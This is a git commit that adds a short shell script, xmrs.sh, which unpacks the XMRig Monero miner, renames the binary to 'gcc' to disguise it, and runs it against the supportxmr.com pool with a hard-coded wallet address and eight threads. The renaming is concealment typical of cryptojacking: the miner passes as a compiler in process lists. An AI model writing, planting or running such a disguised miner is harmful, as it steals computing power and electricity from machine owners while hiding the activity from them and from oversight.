fd68242710ab410277543c18d111c67977ba0658
liumiktmp <75917038+liumiktmp@users.noreply.github.com>
2020-12-14 15:44:14 +0800

    Initial commit

---
+++ xmrs.sh
@@ -0,0 +1,5 @@
+unzip xmrs.zip
+cd xmrs
+chmod +x xmrig
+mv xmrig gcc
+./gcc --coin monero -o pool.supportxmr.com:5555 -u 83gjzEyTpVSCt4FuXgibqHaEYYirJS8DTXP1u2rR7W91EUMa3axapJaLZ95qvjjsD4eoCf8Srs9iiFKUGorYDNo93zk3JMR -p x -k --threads=8
